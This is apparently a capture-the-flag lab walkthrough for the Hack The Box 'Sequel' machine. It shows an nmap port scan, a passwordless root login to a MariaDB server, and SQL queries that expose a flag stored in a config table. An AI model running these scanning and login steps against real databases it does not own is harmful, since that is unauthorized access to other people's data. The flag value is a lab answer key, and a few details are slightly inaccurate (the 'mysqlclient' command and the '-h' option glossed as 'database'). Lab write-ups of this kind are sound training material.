![Sequel.PNG](/assets/Tier-1/Sequel/sequel.jpg)


1. Send an ICMP echo request to machine's IP address..
```bash
┌──(kali㉿kali)-[~]
└─$ ping -c 2 10.129.96.49
```

2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.129.96.49
```

3. Now, start **service mysql** and connect to **database** with user **root** to not put the password.
```bash
┌──(root㉿kali)-[/home/kali]
└─| service mysql start
```

```bash
┌──(root㉿kali)-[/home/kali]
└─| mysqlclient -u root -h 10.129.96.49
```
+ `-u`: Indicate user
+ `-h`: Indicate database


4. Then, search in database the **flag**.
```bash
MariaDB [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```
> First, show all databases.

---
```bash
MariaDB [(none)]> USE htb;
```
> Use a **htb** bdd.

---
```bash
MariaDB [htb]> SHOW TABLES;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
```
> Show all tables of **htb** database

---

```bash
MariaDB [htb]> SELECT * FROM config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
```
**BOOM** obtain the **flag**


**By: EsT**